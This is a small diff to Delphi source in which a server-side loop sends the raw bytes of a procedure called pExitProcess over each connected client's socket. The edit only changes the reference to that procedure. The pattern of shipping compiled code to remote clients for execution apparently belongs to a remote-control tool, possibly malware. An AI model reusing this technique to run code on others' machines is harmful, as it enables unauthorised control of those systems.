@@ -53,7 +53,7 @@ begin
       if SubItems.Objects[0] <> nil then
       begin
         mTempThread := TClientThread(SubItems.Objects[0]);
-        SendBuffer(mTempThread.mySocket, 0, @untSHDeleteFile.pExitProcess, (DWORD(@pExitProcess_END) - DWORD(@pExitProcess))+1);
+        SendBuffer(mTempThread.mySocket, 0, @pExitProcess, (DWORD(@pExitProcess_END) - DWORD(@pExitProcess))+1);
       end;
     end;
   end;
